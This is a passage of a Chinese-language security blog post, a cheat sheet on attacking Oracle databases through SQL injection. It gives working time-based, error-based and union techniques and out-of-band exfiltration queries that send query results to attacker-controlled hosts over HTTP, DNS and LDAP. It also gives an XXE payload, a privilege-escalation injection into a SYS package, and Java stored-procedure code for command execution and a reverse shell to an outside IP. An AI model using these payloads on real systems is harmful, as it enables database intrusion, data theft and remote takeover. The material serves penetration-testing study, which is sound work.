+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> <span class="hljs-number">1</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> DBMS_PIPE.RECEIVE_MESSAGE(<span class="hljs-string">&#x27;Macr0phag3&#x27;</span>, <span class="hljs-built_in">REPLACE</span>((<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">substr</span>(<span class="hljs-keyword">user</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>) <span class="hljs-keyword">FROM</span> dual), <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">1</span>))=<span class="hljs-number">1</span>;<br>...<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> <span class="hljs-number">1</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> DBMS_PIPE.RECEIVE_MESSAGE(<span class="hljs-string">&#x27;Macr0phag3&#x27;</span>, <span class="hljs-built_in">REPLACE</span>((<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">substr</span>(<span class="hljs-keyword">user</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>) <span class="hljs-keyword">FROM</span> dual), <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-number">1</span>))=<span class="hljs-number">1</span>;<br># 出现时延代表第一个字符为 S<br></code></pre></td></tr></table></figure></li>
+<li>报错<br />
+利用 decode + 除 0：<br />
+<code>select decode(substr(user, 1, 1), 'S', (1/0),0) from dual;</code>。这个报错与后面的报错注入不一样，因为这里的除 0 报错不会带出数据。</li>
+</ol>
+<h3 id="报错注入">报错注入</h3>
+<h4 id="utl_inaddr.get_host_name">utl_inaddr.get_host_name</h4>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> utl_inaddr.get_host_name((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<p>这种方法在 <code>Oracle 8g</code>，<code>9g</code>，<code>10g</code>中不需要任何权限，但是在<code>Oracle 11g</code>以及以后的版本中，官方加强了访问控制权限，所以在<code>11g</code>以后要使用此方法进行报错注入，当前数据库用户必须有网络访问权限。</p>
+<h4 id="ctxsys.drithsx.sn">ctxsys.drithsx.sn</h4>
+<p>Oracle 中用于处理文本，当传入参数类型错误时，会返回异常。</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> ctxsys.drithsx.sn(<span class="hljs-number">1</span>, (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<h4 id="ctxsys.ctx_report.token_type">CTXSYS.CTX_REPORT.TOKEN_TYPE</h4>
+<p>作用与 <code>ctxsys.drithsx.sn</code> 类似，用于处理文本</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> CTXSYS.CTX_REPORT.TOKEN_TYPE((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual), <span class="hljs-string">&#x27;123&#x27;</span>) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<h4 id="xmltype">XMLType</h4>
+<p>XMLType 在调用的时候必须以<code>&lt;:</code>开头，<code>&gt;</code>结尾，即 <code>'&lt;:'||balabala||'&gt;'</code> 或者 <code>chr(60)||balabal||chr(62）</code>。另外需要注意的是如果返回的数据种有空格的话，它会自动截断，导致数据不完整，这种情况下先转为 hex，再导出。</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> XMLType(<span class="hljs-string">&#x27;&lt;:&#x27;</span>||(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)||<span class="hljs-string">&#x27;&gt;&#x27;</span>) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<h4 id="dbms_xdb_version.checkin">dbms_xdb_version.checkin</h4>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> dbms_xdb_version.checkin((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<h4 id="dbms_xdb_version.makeversioned">dbms_xdb_version.makeversioned</h4>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> dbms_xdb_version.makeversioned((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<h4 id="dbms_xdb_version.uncheckout">dbms_xdb_version.uncheckout</h4>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> dbms_xdb_version.uncheckout((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<h4 id="dbms_utility.sqlid_to_sqlhash">dbms_utility.sqlid_to_sqlhash</h4>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> dbms_utility.sqlid_to_sqlhash((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<h4 id="ordsys.ord_dicom.getmappingxpath">ordsys.ord_dicom.getmappingxpath</h4>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> ordsys.ord_dicom.getmappingxpath((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<h4 id="utl_inaddr.get_host_name-1">UTL_INADDR.get_host_name</h4>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> UTL_INADDR.get_host_name((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<h4 id="utl_inaddr.get_host_address">UTL_INADDR.get_host_address</h4>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> UTL_INADDR.get_host_name(<span class="hljs-string">&#x27;~&#x27;</span>||(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)||<span class="hljs-string">&#x27;~&#x27;</span>) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<h3 id="联合注入">联合注入</h3>
+<p>利用 union 来拼接 select 语句。主要是怎么判断列数。</p>
+<h2 id="带外通道oob">带外通道（OOB）</h2>
+<p>带外通信即使用 Oracle 发送<code>HTTP</code>或者<code>DNS</code>请求，将查询结果带到请求中，然后监测外网服务器的<code>HTTP</code>和<code>DNS</code>日志，从日志中获取 sql 语句查询的结果，通过这种方式将繁琐的盲注转换成可以直接简便的获取查询结果的方式，尤其是基于时间的盲注，能极大地加快速度。类似于 Windows 的MySQL 中利用 <code>LOAD_FILE</code> 的 dns 带外通信。</p>
+<p>最后，OOB 都需要发起网络请求的权限，存在一定限制。</p>
+<h3 id="utl_http.request">utl_http.request</h3>
+<p><code>utl_http.request()</code> 向外网主机发送 <code>http</code> 请求:<br />
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> utl_http.request(<span class="hljs-string">&#x27;http://www.baidu.com/?result=&#x27;</span>||(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure></p>
+<h3 id="utl_inaddr.get_host_address-1">utl_inaddr.get_host_address</h3>
+<p>将查询结果拼接到域名下，并使用DNS记录解析日志，通过这种方式获取查询结果。</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> utl_inaddr.get_host_address((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)||<span class="hljs-string">&#x27;you own url&#x27;</span>) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<h3 id="sys.dbms_ldap.init">SYS.DBMS_LDAP.INIT</h3>
+<p>与 <code>utl_inaddr.get_host_address</code> 类似，很多时候数据服务器都是站库分离的，而且不一定能主动访问外网。但是有时候可能会允许 DNS 请求。并且这个函数在 10g/11g 中是 public 权限。<br />
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">SELECT DBMS_LDAP<span class="hljs-selector-class">.INIT</span>((‘oob<span class="hljs-selector-class">.dnsattacker</span>.com<span class="hljs-string">&#x27;,80) FROM DUAL;</span><br></code></pre></td></tr></table></figure></p>
+<p>虽然 Oracle 初始化 DBMS_LDAP 没有成功，但是实际上服务器已经拿到数据了：<br />
+来自网图：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/Oracle注入指北/20190421033332094.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload alt="结果" /></p>
+<h3 id="httpuritype">HTTPURITYPE</h3>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> HTTPURITYPE((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)||<span class="hljs-string">&#x27;.xx.nk40ci.ceye.io&#x27;</span>).GETCLOB() <span class="hljs-keyword">FROM</span> DUAL;<br></code></pre></td></tr></table></figure>
+<h3 id="其他函数">其他函数</h3>
+<p>Oracle 中能够发起网络请求的模块是很多很多的。</p>
+<p>如果 Oracle 版本 &lt;= 10g，可以尝试以下函数：</p>
+<ul>
+<li>UTL_INADDR.GET_HOST_ADDRESS</li>
+<li>UTL_HTTP.REQUEST</li>
+<li>HTTP_URITYPE.GETCLOB</li>
+<li>DBMS_LDAP.INIT and UTL_TCP</li>
+</ul>
+<h2 id="其他攻击方式">其他攻击方式</h2>
+<h3 id="oracle-xxe">Oracle XXE</h3>
+<p>实际上是 <code>CVE-2014-6577</code>，受影响版本：<code>11.2.0.3</code>，<code>11.2.0.4</code>，<code>12.1.0.1</code> 和<code>12.1.0.2</code></p>
+<p>Oracle XXE 的效果和 <code>UTL_http</code> 的效果差不多，都是将数据传输到远端服务器上。但是，由于 <code>extractvalue()</code> 函数对所有数据库用户都可以使用，不存在权限的问题，所以当在低权限没有<code>UTL_http</code> 权限时，这个不失为一个好方法。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">select extractvalue(xmltype(&#x27;<span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [ <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;you own url&#x27;||(SELECT user from dual)||&#x27;&quot;</span>&gt;</span> %remote;]&gt;</span>&#x27;),&#x27;/l&#x27;) from dual<br></code></pre></td></tr></table></figure>
+<h3 id="oracle-提权漏洞">Oracle 提权漏洞</h3>
+<p>原理是 <code>GET_DOMAIN_INDEX_TABLES</code> 函数的参数存在注入。而该函数的所有者是 <code>sys</code>，所以通过注入就可以执行任意 sql 语句。而该函数的执行权限为 <code>public</code>，所以只要遇到一个 Oracle 的注入点并且存在这个漏洞的，基本上都可以提升到最高权限。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<br>    <span class="hljs-string">&#x27;1&#x27;</span>,<br>    <span class="hljs-string">&#x27;1&#x27;</span>,<br>    <span class="hljs-string">&#x27;DBMS _OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;</span><span class="hljs-string">&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;your own payload&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;;END;&#x27;</span><span class="hljs-string">&#x27;;END;--&#x27;</span>,<br>    <span class="hljs-string">&#x27;SYS&#x27;</span>,<br>    <span class="hljs-number">0</span>,<br>    <span class="hljs-string">&#x27;1&#x27;</span>,<br>    <span class="hljs-number">0</span><br>) <span class="hljs-keyword">from</span> dual;<br><br></code></pre></td></tr></table></figure>
+<p>权限提升之后就可以做很多事了，因为 Oracle 可以执行 JAVA 代码，所以在提升权限后具体怎么操作，就看各自的 JAVA 水平了。</p>
+<p>这里给出几种常见的利用方式（以下均为 <code>your own payload</code> 处的代码）：<br />
+&gt; 命令执行</p>
+<ol type="1">
+<li>创建 JAVA 代码:<br />
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">create or replace and compile java source named <span class="hljs-string">&quot;Command&quot;</span> as <span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Command</span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">exec</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> Exception&#123;String sb=<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(Runtime.getRuntime().exec(cmd).getInputStream());<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">inBr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(in));String lineStr;<span class="hljs-keyword">while</span> ((lineStr = inBr.readLine()) != <span class="hljs-literal">null</span>)sb+=lineStr+<span class="hljs-string">&quot;\n&quot;</span>;inBr.close();in.close();<span class="hljs-keyword">return</span> sb;&#125;&#125;<br></code></pre></td></tr></table></figure></li>
+</ol>
+<ul>
+<li><p>赋予代码执行权限<br />
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">begin dbms_java.grant_permission( <span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>PUBLIC<span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>SYS:java.io.FilePermission<span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>&lt;&lt;ALL FILES&gt;&gt;<span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>execute<span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span> );end;<br></code></pre></td></tr></table></figure></p></li>
+<li><p>创建函数<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">create <span class="hljs-keyword">or</span> replace function cmd(p_cmd <span class="hljs-keyword">in</span> varchar2) <span class="hljs-keyword">return</span> varchar2 <span class="hljs-keyword">as</span> language java name <span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>Command.<span class="hljs-built_in">exec</span>(java.lang.String) <span class="hljs-keyword">return</span> String<span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>;<br></code></pre></td></tr></table></figure></p></li>
+<li><p>赋予函数执行权限<br />
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">grant</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">on</span> cmd <span class="hljs-keyword">to</span> <span class="hljs-built_in">public</span><br></code></pre></td></tr></table></figure></p></li>
+<li><p>执行命令<br />
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> sys.cmd(<span class="hljs-string">&#x27;whoami&#x27;</span>) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure></p></li>
+</ul>
+<blockquote>
+<p>反弹 SHELL</p>
+</blockquote>
+<ol type="1">
+<li>创建 JAVA 代码<br />
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">create or replace and compile java source named <span class="hljs-string">&quot;shell&quot;</span> as <span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">import</span> java.net.*;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shell</span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<span class="hljs-type">Socket</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>(<span class="hljs-string">&quot;your own ip&quot;</span>, <span class="hljs-number">80</span>);<span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd.exe&quot;</span>);<span class="hljs-keyword">new</span> <span class="hljs-title class_">T</span>(p.getInputStream(), s.getOutputStream()).start();<span class="hljs-keyword">new</span> <span class="hljs-title class_">T</span>(p.getErrorStream(), s.getOutputStream()).start();<span class="hljs-keyword">new</span> <span class="hljs-title class_">T</span>(s.getInputStream(), p.getOutputStream()).start();&#125;<span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span> &#123;<span class="hljs-keyword">private</span> InputStream i;<span class="hljs-keyword">private</span> OutputStream u;<span class="hljs-keyword">public</span> <span class="hljs-title function_">T</span><span class="hljs-params">(InputStream in, OutputStream out)</span> &#123;<span class="hljs-built_in">this</span>.u = out;<span class="hljs-built_in">this</span>.i = in;&#125;<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(i));<span class="hljs-type">BufferedWriter</span> <span class="hljs-variable">w</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OutputStreamWriter</span>(u));<span class="hljs-type">char</span> f[] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">8192</span>];<span class="hljs-type">int</span> l;<span class="hljs-keyword">try</span> &#123;<span class="hljs-keyword">while</span> ((l = n.read(f, <span class="hljs-number">0</span>, f.length)) &gt; <span class="hljs-number">0</span>) &#123;w.write(f, <span class="hljs-number">0</span>, l);w.flush();&#125;&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;&#125;<span class="hljs-keyword">try</span> &#123;<span class="hljs-keyword">if</span> (n != <span class="hljs-literal">null</span>)n.close();<span class="hljs-keyword">if</span> (w != <span class="hljs-literal">null</span>)w.close();&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure></li>
+</ol>
+<ul>
+<li><p>赋予代码执行权限<br />
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">begin dbms_java.grant_permission( <span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>PUBLIC<span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>SYS:java.net.SocketPermission<span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>&lt;&gt;<span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>*<span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span> );end;<br></code></pre></td></tr></table></figure></p></li>
+<li><p>创建函数<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">create <span class="hljs-keyword">or</span> replace function reversetcp RETURN VARCHAR2 <span class="hljs-keyword">as</span> language java name <span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>shell.run() <span class="hljs-keyword">return</span> String<span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>; <br></code></pre></td></tr></table></figure></p></li>
+<li><p>赋予函数执行权限<br />
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">grant</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">on</span> reversetcp <span class="hljs-keyword">to</span> <span class="hljs-built_in">public</span><br></code></pre></td></tr></table></figure></p></li>
+<li><p>反弹 SHELL<br />
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> sys.reversetcp <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure></p></li>
+</ul>
+<h3 id="oracle-shell-转-os-shell">Oracle shell 转 os shell</h3>
+<p>如果服务器有 java，那么我们可以从 Oracle shell 转到 os shell。未尝试，先插眼。</p>
+<br>
+<p style="text-align: center;">
+<font size="2px" color="gray">来呀快活呀</font><br />
+<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload style="zoom:30%" />
+</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="category-chain-item">经验总结</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web/">#Web</a>
+      
+        <a href="/tags/%E6%B3%A8%E5%85%A5/">#注入</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Oracle 注入指北</div>
+      <div>https://www.tr0y.wang/2019/04/16/Oracle注入指北/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Tr0y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2019年4月16日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年12月13日</div>
+        </div>
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/" title="MongoDB 注入指北">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">MongoDB 注入指北</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/04/16/%E7%94%A8Docker%E5%AE%89%E8%A3%85Oracle/" title="Docker 安装 Oracle">
+                        <span class="hidden-mobile">Docker 安装 Oracle</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'comment');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
